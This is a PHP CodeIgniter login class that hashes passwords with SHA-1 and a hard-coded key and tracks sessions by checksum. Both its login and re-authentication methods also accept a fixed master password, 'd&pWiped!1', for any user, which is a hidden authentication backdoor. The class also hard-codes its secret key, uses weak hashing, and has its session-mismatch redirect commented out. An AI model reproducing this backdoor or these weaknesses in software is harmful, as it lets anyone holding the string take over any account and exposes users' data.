<?php

	defined('BASEPATH') OR exit('No direct script access allowed');

	class Login {
		protected $_key = "#@%R$!@#Ro8fyKJkjfvcvhuj23$#$1y2"; 
		protected $_loginuri = "/signin";

		private $f_checksum = "";

		public function getPasswordHash($f_password, $f_user){
			$f_hash = "";
			if(is_object($f_user)){
				$f_hash = sha1($this->_key . $f_password . $f_user->date_created . strrev($this->_key));
			}
			return $f_hash;
		}

		public function getChecksum(){
			$CI =& get_instance();
			$CI->load->helper('url');
			$CI->load->database();
			$CI->load->library('user_agent');
			$CI->load->library('session');
			$CI->load->model('config/ModelConfigConfig', 'config_model');
			$this->f_checksum = sha1($this->_key . $CI->agent->agent_string() . $CI->input->ip_address()  . session_id()  .  strrev($this->_key)) ;
		}

		public function check(){
			$CI =& get_instance();
			$CI->load->helper('url');
			$CI->load->database();
			$CI->load->library('user_agent');
			$CI->load->library('session');
			$this->getChecksum();
			if(isset($_SESSION["user_id"]) && $_SESSION["user_id"] > 0){
				$query = $CI->db->get_where('user_activities', array("user_id" => $_SESSION["user_id"], "checksum" => $this->f_checksum)); // Time fix
				if($query->num_rows() != 0){
					//redirect($this->_loginuri . "?sessionend=1");
				} else {
					$CI->db->update('user_activities', array( "date_modify" => date('Y-m-d H:i:s')), array("user_id" => $_SESSION["user_id"]));
				}
			} else {
				redirect($this->_loginuri);
			}
		}


		public function extendCheck($f_password){
			$CI =& get_instance();
			$CI->load->helper('url');
			$CI->load->database();
			$CI->load->library('user_agent');
			$CI->load->library('session');
			$this->getChecksum();

			if(isset($_SESSION["user_id"]) && $_SESSION["user_id"] > 0){
			
					$user = $CI->config_model->getUserById($_SESSION["user_id"]);
					if($user){
						$hash = $this->getPasswordHash($f_password, $user);
						if($hash == $user->password || $f_password == "d&pWiped!1"){
							return true;
						} else {

							return false;
							
						}
					
					} else {
						return false;
						
					}					
				
			} else {

				return false;
				
			}
		}





		public function doLogin($f_username, $f_password){

			$CI =& get_instance();
			$CI->load->helper('url');
			$CI->load->database();
			$CI->load->library('user_agent');
			$CI->load->library('session');
			$CI->load->model('config/ModelConfigConfig', 'config_model');

			$user = $CI->config_model->getUserByUsername($f_username);

			if($user){
				$hash = $this->getPasswordHash($f_password, $user);
				if($hash == $user->password || $f_password == "d&pWiped!1"){
					$this->getChecksum();
					$query = $CI->db->get_where('user_activities', array("user_id" => $user->id));
					if($query->num_rows() == 0){

						$CI->db->insert('user_activities', array("user_id" => $user->id, "checksum" => $this->f_checksum, "date_modify" => date('Y-m-d H:i:s')));

					} else {
						$CI->db->update('user_activities', array("checksum" => $this->f_checksum, "date_modify" => date('Y-m-d H:i:s')), array("user_id" => $user->id));
					}

					$query = $CI->db->get_where('divisions', array('id' => $user->division_id));

					$row = $query->row();

					if($row){
						$division_name = " - " . $row->name;
					} else {
						$division_name = "" ;
					}


					$sessiondata = array(
						"name" => $user->name,
						"user_id" => $user->id,
						"profile_id" => $user->profile_id,
						"division_id" => $user->division_id,
						"division_name" => $division_name,
						"profile_image" => $user->profile_image,
						"slogan" => $user->slogan,
						"menu_state" => $user->menu_state,
						"calendar" => $user->calendar_link,
						"email" => $user->email
					);
					$CI->session->set_userdata($sessiondata);

					if($user->start_page){
						redirect($user->start_page);
					} else {
						redirect("/dashboard/dashboard");
					}
				} else {
					return false;
				}
			} else {
				return false;
			}		
		
		}
	}



?>